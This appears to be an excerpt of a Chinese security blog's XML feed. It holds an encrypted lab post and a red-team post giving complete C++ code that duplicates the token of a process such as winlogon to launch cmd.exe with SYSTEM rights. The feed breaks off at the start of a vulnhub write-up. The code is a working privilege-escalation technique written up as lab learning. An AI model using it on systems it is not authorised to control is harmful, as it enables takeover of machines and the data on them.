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</div><script src="/lib/crypto-js.js"></script><script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>通过winlogon进程创建令牌运行SYSTEM权限的shell</title>
      <link href="/posts/44f47c5e.html"/>
      <url>/posts/44f47c5e.html</url>
      <content type="html"><![CDATA[<h2 id="README"><a href="#README" class="headerlink" title="README"></a>README</h2><p>有点想知道怎么不通过创建服务的方式来用SYSTEM权限运行指定的进程，我很好奇。网上搜了搜，分析了一下别人写的，学习了一哈<br><img src="https://s2.ax1x.com/2020/03/02/3WUpKx.jpg" alt=""></p><h2 id="整体流程"><a href="#整体流程" class="headerlink" title="整体流程"></a>整体流程</h2><p>1.获取指定进程的令牌句柄<br>2.通过令牌句柄创建主令牌<br>2.通过创建的令牌执行新的Process</p><h2 id="实现过程"><a href="#实现过程" class="headerlink" title="实现过程"></a>实现过程</h2><p>head.h</p><pre><code class="cpp">#pragma once#include &quot;iostream&quot;#include &quot;string&quot;#include &quot;Windows.h&quot;using namespace::std;</code></pre><p>main.cpp</p><pre><code class="cpp">#include &quot;stdafx.h&quot;#include &quot;head.h&quot;class Jack{public:       HANDLE GetAccessToken(DWORD pid) {              HANDLE currentProcess = {};              HANDLE Asstoken = {};              DWORD LastError;              currentProcess = OpenProcess(PROCESS_QUERY_INFORMATION, TRUE, pid);              if (!currentProcess) {                     LastError = GetLastError();                     cout &lt;&lt; &quot;ERROR:OpenProcess(): &quot; &lt;&lt; LastError &lt;&lt; endl;                     return (HANDLE)NULL;              }              if (!OpenProcessToken(currentProcess, TOKEN_ASSIGN_PRIMARY |  TOKEN_DUPLICATE | TOKEN_IMPERSONATE | TOKEN_QUERY, &amp;Asstoken)) {                     LastError = GetLastError();                     cout &lt;&lt; &quot;ERROR:OpenProcessToken(): &quot; &lt;&lt; LastError &lt;&lt; endl;                     return (HANDLE)NULL;              }              return Asstoken;       }       void Runprocess(HANDLE Token) {              DWORD LastError;              if (!DuplicateTokenEx(Token, MAXIMUM_ALLOWED, NULL,  SecurityImpersonation, TokenPrimary, &amp;Token)) {                     LastError = GetLastError();                     cout &lt;&lt; &quot;ERROR:DuplicateTokenEx(): &quot; &lt;&lt; LastError &lt;&lt; endl;              }              STARTUPINFOW si = {};              PROCESS_INFORMATION pi = {};              BOOL ret;              ret = CreateProcessWithTokenW(Token, LOGON_NETCREDENTIALS_ONLY,  L&quot;C:\\Windows\\System32\\cmd.exe&quot;, NULL, CREATE_NEW_CONSOLE, NULL, NULL, &amp;si,  &amp;pi);              if (!ret) {                     LastError = GetLastError();                     cout &lt;&lt; &quot;ERROR:CreateProcessWithTokenW(): &quot; &lt;&lt; LastError &lt;&lt;  endl;              }       }};//wmain()或main()还是其他main函数。第二个参数里有两个*的代表是转成十六进制，一个*的则是正常值。int wmain(int argc,WCHAR **argv) { //wmain()是UNICODE版本的main()， _tmain()是个宏，如果是UNICODE则它是wmain()       if (argc &lt; 2)       {              cout &lt;&lt; &quot;Usage winlogon &lt;Pid&gt;&quot; &lt;&lt; endl;              return 1;       }       DWORD pid;       pid = _wtoi(argv[1]); //十六进制转整       cout &lt;&lt; &quot;[+] PID: &quot; &lt;&lt; pid &lt;&lt; endl;       Jack jk;       HANDLE Ptoken=jk.GetAccessToken(pid);       jk.Runprocess(Ptoken);       return 0;}</code></pre><p><img src="https://s2.ax1x.com/2020/03/02/3WUTWd.png" alt=""></p><p>以Administrator权限运行cmd<br><img src="https://s2.ax1x.com/2020/03/02/3WUgQ1.png" alt=""></p>]]></content>
      
      
        <tags>
            
            <tag> 红队实验 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>vulnhub-mr.Robot</title>
      <link href="/posts/d25ade48.html"/>
      <url>/posts/d25ade48.html</url>
